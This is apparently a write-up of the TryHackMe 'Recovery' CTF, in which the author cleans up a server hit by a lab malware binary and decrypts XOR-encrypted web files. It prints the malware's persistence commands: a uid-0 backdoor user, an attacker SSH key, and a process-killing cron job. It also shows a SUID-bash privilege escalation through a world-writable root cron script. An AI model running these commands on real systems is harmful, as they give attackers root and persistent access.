# Recovery

## Background

> Not your conventional CTF

> Difficulty: Medium

- Overall difficulty for me: Medium

Hi, it's me, your friend Alex.

I'm not going to beat around the bush here; I need your help. As you know I work at a company called Recoverysoft. I work on the website side of things, and I setup a Ubuntu web server to run it. Yesterday one of my work colleagues sent me the following email:

```
Hi Alex,
A recent security vulnerability has been discovered that affects the web server. Could you please run this binary on the server to implement the fix?
Regards
- Teo
```

Attached was a linux binary called fixutil. As instructed, I ran the binary, and all was good. But this morning, I tried to log into the server via SSH and I received this message:

```
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
```

It turns out that Teo got his mail account hacked, and fixutil was a targeted malware binary specifically built to destroy my webserver!

when I opened the website in my browser I get some crazy nonsense. The webserver files had been encrypted! Before you ask, I don't have any other backups of the webserver (I know, I know, horrible practice, etc...), I don't want to tell my boss, he'll fire me for sure.

Please access the web server and repair all the damage caused by fixutil. You can find the binary in my home directory. Here are my ssh credentials:

```
Username: alex
Password: madeline
```

I have setup a control panel to track your progress on port 1337. Access it via your web browser. As you repair the damage, you can refresh the page to receive those "flags" I know you love hoarding.

Good luck!
- Your friend Alex

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
Open 10.10.250.208:22
Open 10.10.250.208:80
Open 10.10.250.208:1337
Open 10.10.250.208:65499
[...]
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 55:17:c1:d4:97:ba:8d:82:b9:60:81:39:e4:aa:1e:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqaXDoAAvwHBvNhrHfjZaxCgLbQAImpPRiPxxetRqPQYVPusw2lV6HPV1j2ymgdsaA7bNP8jroSq54c2mVLyYVYwbdUscYuLMj/RflPxHx/18J2LF0FnhyRsX8iszNqQ+BqDQ74O2hyN/Cqbwy8pm6i75QRIBlyFRzFwihqSqCDp9OO75Y9wr2+iQX8yzL7CJjnS5w+vEdnGsf88Mzs/NZxB2ZHoDf3lw8uMo0iHg23GfPntVilr01AP6szDOHIMlMMk6pMqkU7MrXvJz+Ij+MP8b1+5T0uBB4MgtrUyQLXyRZGX4M30YGdR+jnfAjIKEjAEqrSyotr+l+hLEgUNHT
|   256 8d:f5:4b:ab:23:ed:a3:c0:e9:ca:90:e9:80:be:14:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCjzHLHSekU/G6uRjXbHIsERaRTzJ+a1lVwvIXkLoaqhlHIM616JxWkaUD0CxzLjrnSjxKsjI1YXcrHYFNd2rys=
|   256 3e:ae:91:86:81:12:04:e4:70:90:b1:40:ef:b7:f1:b6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHR259lx5M/24wvX1dnbS1ehHzmK4sr1B7aZqsfIesOB
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.43 ((Unix))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.43 (Unix)
1337/tcp  open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Help Alex!
|_http-server-header: nginx/1.14.0 (Ubuntu)
65499/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:b6:aa:93:8d:aa:b7:f3:af:71:9d:7f:c5:83:1d:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIefQd78mUpATjIg691Z6jdxWq6XjvivNMdaV3PrE70ee0YPwQxQwNYswl7v1k+r9c1PENL8ol4wokp/nk2omQP3Iwua/STVYo6Xdh9DIgC7x68FWaJn/t24zhKKZ/v8vHIIulI5sdHTQzapVgIqhZFHW1JhvmdObuKGccGRQddPElr2pwguwSdNOzW21h8LPMr7wEiafbaLhM09fEN0UUWwDF4RfFo5GoW7Mhz4Y64PxlH6CbrAS/z0sPe7F3nx2/YNdvM83VNNtGCSOnSbmt0AbgZHh/Zv05RM8p1QR4EoMSi4ogQW6VH78GNRROG2V+P56u1VQ/Je6CXLMWML69
|   256 64:98:14:38:ff:38:05:7e:25:ae:5d:33:2d:b6:78:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFh4xjNznqUWlomutlVT1AIG/RmduH5bjmze2euH63jQRqYS1h8Y4Negc4cw4CXm3HpkxtYctO4VAaGwHCGNWk=
|   256 ef:2e:60:3a:de:ea:2b:25:7d:26:da:b5:6b:5b:c4:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/31imc1cKaUsvUlgomJ1RGFpLTNcb1YDT+TDXJ03R5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Note: I switched to `rustscan` version 1.10.0, as other versions have a weird error message. 

According to `rustscan` result, we have 4 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.9p1 Debian
80                | Apache httpd 2.4.43
1337              | nginx 1.14.0 (Ubuntu)
65499             | OpenSSH 7.6p1 Ubuntu

## HTTP on Port 80

**index.html:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# wget http://10.10.250.208/index.html    

┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# cat index.html                               
}E7&3<'LRKX[}fLFKQ	 McPpEWfLFKQW"50	
5X\$	xflKMLLaDSIL#*	XaMLLaDSIPpEWf	LKDSIPpEWfLFKMLLa7
                                                          |LVPgLLaDSIPpEWfLgLLaDSIPpEWfLLKfLaDSIPpEWfLFKMLL'
/^�"                                                                                                        ]6�/QM
    }fFKMLLaDSIPpEWfLl>_W%    WKDSIPpEWfLFKMfKDSIPpEWfLFKM]ayIPpEWfLFKMLLaDSI?
                                                                              VLuTKZEWfLFKMLLaDSIPpE�'A.jEBvPgLLaDSIPpEWfLFKMLp*NZ]\IaISQ@ ^}fFKMLLaDSIPpEWfLF	
                                        &4H)	WLO$RzpEWfLFKMLLaDSIPp"
ZoWfLFKMLLaDSI?aDSIPpE�'A.II@koWfLFKMLLaDSI
#FgLLaDSIPpEWfLFKML.�?
                      Mf
WKDSIPpEWfLFKMLLaD$
3�]2PgLLaDSIPpEWfLFKMLpTGvI]aMLLaDSIPpEWfLFKM
2
 QM]\1HcPpEWfLFKMLLaDSIP6
ZEWfLFKMLPn5[}fLFKQC$WzZEWfLZ  nSIPpEWfLZ\R>$")
WB]nyIPpEWfLFWRfaDSIPpEWfLFK?	.	
La
  p3F   25E3]cPpEWfLFKQCnyIPpEWfLFW5
                                    W75W       }K$
xflKMLLaDSIL6
&S9#F	L--LaDSIPpEWfL1
           I#�#BfaDSIPpEWzC	3ZyIPpEKi	Rf}K[ 
```

Lots of gibberish, maybe it's encrypted?

## HTTP on Port 1337

**index.html:**
```
Each time you remove part of the malware and press the refresh button, a flag will show up below.

Good luck!
```

**View-Source:**
```html
        <!-- Hacking this site isn't part of the challenge. -->
```

## SSH on Port 22

**SSH Credentials:**

- Username: alex
- Password: madeline

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# ssh alex@$RHOSTS                    
[...]
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
[...]
```

Some while loop is happening? It kept echoing `YOU DIDN'T SAY THE MAGIC WORD!`.

## SSH on Port 65499

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# ssh alex@$RHOSTS -p 65499
[...]
alex@10.10.250.208's password: 
Permission denied, please try again.
```

The credentials are not correct in this port.

# Initial Foothold

In SSH on port 22, instead of using **pty** shell, why not try to use a `tty` shell?

We can do this via `-T` option in `ssh`:

**SSH manual page:**
```
-T      Disable pseudo-terminal allocation.
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# ssh alex@$RHOSTS -T
alex@10.10.250.208's password: 
[...]
whoami;hostname;id
alex
recoveryserver
uid=1000(alex) gid=1000(alex) groups=1000(alex)
```

We're in!

## Flag0

In the home directory of the user `alex`, there is a binary called `fixutil`.

```
ls -lah
total 68K
drwxr-xr-x 1 alex alex 4.0K Sep  7 12:07 .
drwxr-xr-x 1 root root 4.0K Jun 17  2020 ..
-rw------- 1 alex alex    5 Sep  7 12:07 .bash_history
-rw-r--r-- 1 alex alex  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 alex alex 3.6K Jun 17  2020 .bashrc
-rw-r--r-- 1 alex alex  807 Apr 18  2019 .profile
-rwxrwxr-x 1 root root  37K Jun 12  2020 fixutil
```

Let's use `base64` to transfer it!

```
base64 /home/alex/fixutil
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAwBAAAAAAAABAAAAAAAAAACCKAAAAAAAAAAAAAEAAOAAN
[...]
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# subl fixutil.b64
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# base64 -d fixutil.b64 > fixutil

┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# chmod +x fixutil

┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# file fixutil   
fixutil: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cc895c4c0b6852b9c57f08ecb87a232f0777f506, for GNU/Linux 3.2.0, not stripped
```

**We can now `strings` the ELF executable!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# strings fixutil                     
[...]
/usr/local/apache2/htdocs/
/opt/.fixutil/
/opt/.fixutil/backup.txt
/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
/root/.ssh/authorized_keys
/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
/opt/brilliant_script.sh
#!/bin/sh
for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
/etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
:*3$"
[...]
/home/moodr/Boxes/recovery/fixutil
[...]
/home/alex/.bashrc
while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so
/lib/x86_64-linux-gnu/liblogging.so
echo pwned | /bin/admin > /dev/null
[...]
```

From the `fixutil` binary, we can see that `alex`'s `.bashrc` has a weird bash script:

```
/home/alex/.bashrc
while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
```

Let's copy and paste to our attacker machine, then delete that line, and transfer it:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# nano .bashrc

┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# python3 -m http.server 80
```

```
wget http://10.18.61.134/.bashrc -O /home/alex/.bashrc
```

We should now able to `ssh` into `alex` without disabling `pty`!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# ssh alex@$RHOSTS   
alex@10.10.250.208's password: 
[...]
-bash-5.0$ whoami;id
alex
uid=1000(alex) gid=1000(alex) groups=1000(alex)
```

**Flag0:**
```
THM{Redacted}
```

## Flag1

From the `fixutil` binary, there are something important:

- `/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null`
	- The binary adds a new user called `security`.
- `/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e`
	- The binary echos out `security`'s hash, and pipe it to `chpasswd`.

Maybe we can try to crack `security`'s hash?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# nano security.hash                  
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt security.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

But no dice...

Anyways, let's move on.

- `/opt/.fixutil/backup.txt`
	- This `txt` file looks interesting.
- `/opt/brilliant_script.sh`
	- Maybe there is a cronjob's running?
- `/etc/cron.d/evil`
	- A persistence cronjob?

```
-bash-5.0$ ls -lah /opt
[...]
drwx------ 2 root root 4.0K Jun 17  2020 .fixutil
-rwxrwxrwx 1 root root   95 Jun 17  2020 brilliant_script.sh
```

As we can see, the `.fixutil` is NOT accessible for us, as it's owned by `root` and not world-readable/writable/executable.

However, the `brilliant_script.sh` **IS world-writable**, and it's owned by root!

**/opt/brilliant_script.sh:**
```sh
#!/bin/sh

for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
```

This Sh script will:

- Find `bash` processes in `ps aux` and kill it

We also see that the `/opt/brilliant_script.sh` is being run by the cronjob!

```
-bash-5.0$ ls -lah /etc/cron.d
[...]
-rwxr-xr-x 1 root root   61 Jun 17  2020 evil

-bash-5.0$ cat /etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
```

Let's modify the script into adding SUID set bit to `/bin/bash`:

```
-bash-5.0$ echo "chmod +s /bin/bash" > /opt/brilliant_script.sh
```

```
-bash-5.0$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash

-bash-5.0$ /bin/bash -p

bash-5.0# whoami;id
root
uid=1000(alex) gid=1000(alex) euid=0(root) egid=0(root) groups=0(root),1000(alex)
```

We're root!

**Flag1:**
```
THM{Redacted}
```

## Flag2

```
bash-5.0# ls -lah /root
total 32K
drwx------ 1 root root 4.0K Jun 17  2020 .
drwxr-xr-x 1 root root 4.0K Jun 17  2020 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxr-xr-x 1 root root 4.0K Jun 17  2020 .ssh
-rwxrwxr-x 1 root root   54 Jun 17  2020 init_script.sh
```

The `init_script.sh` looks interesting:

**/root/init_script.sh:**
```sh
service ssh start
service cron start
httpd-foreground
```

It's starting service `ssh` and `cron`, and then foreground `httpd`. Nothing interesting.

Anyways, we can now add our SSH public key into `root`'s `.ssh` directory.

```
┌──(root🌸siunam)-[~/…/thm/ctf/Recovery/.ssh]
└─# ssh-keygen                   
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/ctf/thm/ctf/Recovery/.ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/ctf/thm/ctf/Recovery/.ssh/id_rsa
Your public key has been saved in /root/ctf/thm/ctf/Recovery/.ssh/id_rsa.pub
```

```
bash-5.0# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgos5kG2TwZ/J8aImbXLxbOJhWm9rhvU9pW/CtZXCLtrsTMJ7MmTtai3phxy055kXLA8WOfWJBcfMFCYRaqDRZeQtBMVk1nhlKThHZrdDKMLNkLzuoKmemYsgT46NoPaeUAZzZ75v7SfWkk3LaEjYi622hgnV32JLa6H0NLUTVv5bijazRCI+1FksvBIDAL6gAKgYZUc+v3wwWa5LL/9Yiwtxb5JjTaCwQmaAeFGZwWg1ttvNgMHpKHqGCTR5nuuMyFCrrUrVtJNhme20Q3INqYFNvLguDlJ6jkTtv1yqL1oEarhMKsA51NZtkV0sgg3Km2F+Xr/VvLZXkGPs3QGa2iaFnuAYFPh+ogBKr4X2JtaYHAXf5j6A3/Drch+ESGwL8CeLIYM+ahOh3eHF2j3gUHJSiOrjA992j+hqhA4GCvlVyyyFoLFL/mWDZWKurho+qbcMiLcsCV6apw2vegU0RnN4pgqqnvFiXeRCTBQJrgujIOEWHzJCIAar6p/eaoVk= root@siunam" > /root/.ssh/authorized_keys
```

```
┌──(root🌸siunam)-[~/…/thm/ctf/Recovery/.ssh]
└─# ssh -i id_rsa root@$RHOSTS                                              
[...]
root@recoveryserver:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

Since now we're root, we can access `/opt/.fixutil` directory:

```
root@recoveryserver:/opt/.fixutil# ls -lah
[...]
-rw-r--r-- 1 root root   32 Sep  7 13:00 backup.txt

root@recoveryserver:/opt/.fixutil# cat backup.txt 
AdsipPewFlfkmll
aZkSfDsLFFlNvdU
```

Maybe it's a password? I tried to `ssh` to different users, but no luck.

Recall from the `fixutil` binary, there is one more thing we can investigate:

```
/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
```

The previous attacker overwritten the original `/lib/x86_64-linux-gnu/oldliblogging.so` into `/tmp/logging.so`.

If we want to recover the original `.so` shared object, we can just simply rename it:

```
root@recoveryserver:~# mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/newliblogging.so
```

**Flag2:**
```
THM{Redacted}
```

## Flag3

**SUID:**
```
root@recoveryserver:~# find / -perm -4000 2>/dev/null
[...]
/bin/admin
[...]
```

In one of those SUID binaries, the `/bin/admin` stands out.

```
root@recoveryserver:~# file /bin/admin
/bin/admin: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=08edc8d505c845c14fd2350717ddabf8054ac395, not stripped
```

We can transfer the binary via `base64`:

```
root@recoveryserver:~# base64 /bin/admin
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoBAAAAAAAABAAAAAAAAAAKA6AAAAAAAAAAAAAEAAOAAL
[...]
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# subl admin.b64
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# base64 -d admin.b64 > admin    
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# chmod +x admin  
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# file admin  
admin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=08edc8d505c845c14fd2350717ddabf8054ac395, not stripped
```

Let's `strings` it:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# strings admin  
[...]
Welcome to the Recoverysoft Administration Tool! Please input your password:
youdontneedtofindthepassword
This section is currently under development, sorry.
Incorrect password! This will be logged!
[...]
```

- Password: youdontneedtofindthepassword

Let's run the `admin` binary!

```
root@recoveryserver:~# /bin/admin
Welcome to the Recoverysoft Administration Tool! Please input your password:
youdontneedtofindthepassword
This section is currently under development, sorry.
```

**Flag3:**
```
THM{Redacted}
```

## Flag4

Since we have root access, and we saw there is an "backdoor" user called `security`:

```
root@recoveryserver:~# cat /etc/passwd
[...]
security:x:0:0::/home/security:/bin/sh
```

To recover to the original state, we can simply delete that user:

```
root@recoveryserver:~# userdel -rf security
```

**flag4:**
```
THM{Redacted}
```

## Flag5

Let's recall back to the `fixutil` binary, there is 1 last thing that made by the preivous attacker:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# strings fixutil                     
[...]
/usr/local/apache2/htdocs/
```

```
root@recoveryserver:/usr/local/apache2/htdocs# ls -lah
total 28K
drwxr-xr-x 1 root     root     4.0K Jun 17  2020 .
drwxr-xr-x 1 www-data www-data 4.0K May 15  2020 ..
-rw-rw-r-- 1 root     root      997 Sep  7 13:35 index.html
-rw-rw-r-- 1 root     root      109 Sep  7 13:35 reallyimportant.txt
-rw-rw-r-- 1 root     root       85 Sep  7 13:35 todo.html

root@recoveryserver:/usr/local/apache2/htdocs# cat reallyimportant.txt 
<<<�-u4/r"?i6')=<II s&<T7:)4;c297y!2|;\c s(~y78= K+
                                                   s!,1!}34K
                                                            , 'y-{
```

Now, we need to decrypt all 3 files.

To do so, we can:

- Transfer the `liblogging.so` shared object:

```
root@recoveryserver:# base64 /lib/x86_64-linux-gnu/liblogging.so 
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAwBMAAAAAAABAAAAAAAAAAMhRAAAAAAAAAAAAAEAAOAAL
[...]
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# subl liblogging.b64
                                                                                                                    
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# base64 -d liblogging.b64 > liblogging.so
```

- Reverse engineering the `liblogging.so`, I'll use `cutter` to do this:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# /opt/Cutter-v2.0.5-x64.Linux.AppImage liblogging.so
```

By looking through all the functions, there are 3 functions that might doing some encryption:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Recovery/images/a1.png)

In the function `XOREncryptWebFiles`, we can see an encryption key is being stored in `/opt/.fixutil/backup.txt`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Recovery/images/a2.png)

```
root@recoveryserver:~# cat /opt/.fixutil/backup.txt 
AdsipPewFlfkmll
```

Since we have the encryption key, maybe we can decrypt it via XOR?

- Decrypting encrypted files:

Let's transfer the `reallyimportant.txt` file in `/usr/local/apache2/htdocs/`:

```
root@recoveryserver:~# base64 /usr/local/apache2/htdocs/reallyimportant.txt 
FQwaGlAkAA8yTAIEDhkBJAoHSRkjRQUjDQoHFEwFLBQcGwQxCwNoZi9LBQMcJEQdBgQ4DBkhTA4K
HRwJLxdTHR9wDAN9TC9LDg0CZhBTCxUxF1cyBANLGQQDNAMbHVA/A1cqAwkYBAILYQ0HRw==
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# echo "FQwaGlAkAA8yTAIEDhkBJAoHSRkjRQUjDQoHFEwFLBQcGwQxCwNoZi9LBQMcJEQdBgQ4DBkhTA4K
HRwJLxdTHR9wDAN9TC9LDg0CZhBTCxUxF1cyBANLGQQDNAMbHVA/A1cqAwkYBAILYQ0HRw==" | base64 -d > reallyimportant.txt
```

Next, decrypt the file in [CyberChef](https://gchq.github.io/CyberChef):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Recovery/images/a3.png)

We successfully decrypt the file! Let's decrypt all other files:

**/usr/local/apache2/htdocs/todo.html:**
```
root@recoveryserver:~# base64 /usr/local/apache2/htdocs/todo.html 
fUVeRHpwRVdmJUEPTQ4JNRAWG1AjERg2TBYZAg8eIBcHAB4xER4oC0YKAwhMIAcHHBE8CQ5mCAlL
GQQFMkQEDBIgBBAjTWxLTUxMbEQyBRUob1prUg==
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# echo "fUVeRHpwRVdmJUEPTQ4JNRAWG1AjERg2TBYZAg8eIBcHAB4xER4oC0YKAwhMIAcHHBE8CQ5mCAlL
GQQFMkQEDBIgBBAjTWxLTUxMbEQyBRUob1prUg==" | base64 -d > todo.html
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Recovery/images/a4.png)

**/usr/local/apache2/htdocs/index.html:**
```
root@recoveryserver:~# base64 /usr/local/apache2/htdocs/index.html 
fUU3JjMEPCcDTA4fAABSS1gbHR08W31mTEZLUQQJIABNY1BwRVdmTEZLURgFNQgWVyI1BhgwCRQS
HgMKNVhcHRkkCRJ4ZmxLTUxMYURTSUwjEQ4qCVhhTUxMYURTSVBwRVdmDgkPFEwXS0RTSVBwRVdm
TEZLTUxMYUQeCAI3DBl8TFZQZ0xMYURTSVBwRVdmTBthZ0xMYURTSVBwRVdmTExLFmZMYURTSVBw
RVdmTEZLTUxMJwsdHV02BBovAB9RTR8NLxdeGhUiDBF9ZkZLTUxMYURTSVBwRVdmTEYfCBQYbAUf
ABc+X1clCQgfCB5XS0RTSVBwRVdmTEZLTRFmS0RTSVBwRVdmTEZLTQRdYR95SVBwRVdmTEZLTUxM
YURTSRY/CwNrHw8RCFZMdVQDEUtaRVdmTEZLTUxMYURTSVBwRRonHgECA0EOLhAHBh1qRUJ2HB5Q
Z0xMYURTSVBwRVdmTEZLTUwbKAAHAUpwBhYqD05aXVxJYUlTUUAgHV59ZkZLTUxMYURTSVBwRVdm
TEYJDA8HJhYcHB40SBQpAAkZV0xPJAEWUnpwRVdmTEZLTUxMYURTSVBwFRYiCA8FClZMdVQDEUta
RVdmTEZLTUxMYURTSVBwRRonHgECA0EYLhRJSUBrb1dmTEZLTUxMYURTSQ1ab1dmTEZLTUxMYURT
SRY/CgMjHkYQZ0xMYURTSVBwRVdmTEZLTUwcLhcaHRk/C01mCg8TCAhXS0RTSVBwRVdmTEZLTUxM
YUQRBgQkChp8TFZQZ0xMYURTSVBwRVdmTEZLTUwbKAAHAUpwVEd2SV1hTUxMYURTSVBwRVdmTEZL
TQENMwMaB10yCgMyAwtRTV1cMRxIY1BwRVdmTEZLTUxMYURTSVA2ChkyQRUCFwlWYVVAGQhrb1dm
TEZLTUxMYURTSQ1aRVdmTEZLTUxQbhcHEBw1W31mTEZLUUMEJAUXV3paRVdmTFoJAggVf25TSVBw
RVdmTFoDXFI+JAccHxUiHAQpChJXQgRdf255SVBwRVdmTEZXHVJmYURTSVBwRVdmTEZLPwkPLhIW
GwkjChEyTA4OARwfYQ8WDABwHBgzHkYNBAAJMkQACBY1RRYoCEYYCA8ZMwFdY1BwRVdmTEZLUUMc
f255SVBwRVdmTEZXDxkYNQsdVzc1EVcVGAcZGQkIfUsRHAQkChl4ZmxLTUxMYURTSUw2ChgyCRRV
Z0xMYURTSVBwRVdmTDEODxwNJgFTHgI5EQMjAkYJFEwtLQELSSMlCBojHhIEA0JmYURTSVBwRVd6
QwAEAhgJM1p5SVBwRUtpDgkPFFJmfUsbHR08Ww==
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Recovery]
└─# echo "fUU3JjMEPCcDTA4fAABSS1gbHR08W31mTEZLUQQJIABNY1BwRVdmTEZLURgFNQgWVyI1BhgwCRQS
HgMKNVhcHRkkCRJ4ZmxLTUxMYURTSUwjEQ4qCVhhTUxMYURTSVBwRVdmDgkPFEwXS0RTSVBwRVdm
TEZLTUxMYUQeCAI3DBl8TFZQZ0xMYURTSVBwRVdmTBthZ0xMYURTSVBwRVdmTExLFmZMYURTSVBw
RVdmTEZLTUxMJwsdHV02BBovAB9RTR8NLxdeGhUiDBF9ZkZLTUxMYURTSVBwRVdmTEYfCBQYbAUf
ABc+X1clCQgfCB5XS0RTSVBwRVdmTEZLTRFmS0RTSVBwRVdmTEZLTQRdYR95SVBwRVdmTEZLTUxM
YURTSRY/CwNrHw8RCFZMdVQDEUtaRVdmTEZLTUxMYURTSVBwRRonHgECA0EOLhAHBh1qRUJ2HB5Q
Z0xMYURTSVBwRVdmTEZLTUwbKAAHAUpwBhYqD05aXVxJYUlTUUAgHV59ZkZLTUxMYURTSVBwRVdm
TEYJDA8HJhYcHB40SBQpAAkZV0xPJAEWUnpwRVdmTEZLTUxMYURTSVBwFRYiCA8FClZMdVQDEUta
RVdmTEZLTUxMYURTSVBwRRonHgECA0EYLhRJSUBrb1dmTEZLTUxMYURTSQ1ab1dmTEZLTUxMYURT
SRY/CgMjHkYQZ0xMYURTSVBwRVdmTEZLTUwcLhcaHRk/C01mCg8TCAhXS0RTSVBwRVdmTEZLTUxM
YUQRBgQkChp8TFZQZ0xMYURTSVBwRVdmTEZLTUwbKAAHAUpwVEd2SV1hTUxMYURTSVBwRVdmTEZL
TQENMwMaB10yCgMyAwtRTV1cMRxIY1BwRVdmTEZLTUxMYURTSVA2ChkyQRUCFwlWYVVAGQhrb1dm
